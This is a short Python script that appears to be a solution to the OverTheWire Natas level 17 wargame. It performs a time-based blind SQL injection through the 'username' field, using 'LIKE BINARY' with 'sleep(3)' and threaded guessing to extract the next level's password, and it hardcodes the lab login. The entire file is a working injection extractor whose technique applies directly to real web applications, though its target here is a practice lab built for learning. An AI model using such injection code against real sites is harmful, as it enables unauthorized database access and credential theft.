import requests
from concurrent.futures import ThreadPoolExecutor
from requests.auth import HTTPBasicAuth

allword = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
ans = ""

auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")

def main(word):
    global ans
    info = ('natas18" AND password LIKE BINARY "' + ans + word + '%" AND sleep(3)  #')
    req = requests.get("http://natas17.natas.labs.overthewire.org/", auth=auth, params={"username": info}, timeout=10)
    elapsed_time = req.elapsed.total_seconds()
    if elapsed_time >= 3:
        ans += word
        print(ans)

for i in range(32):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(main, word) for word in allword]

    for future in futures:
        future.result()

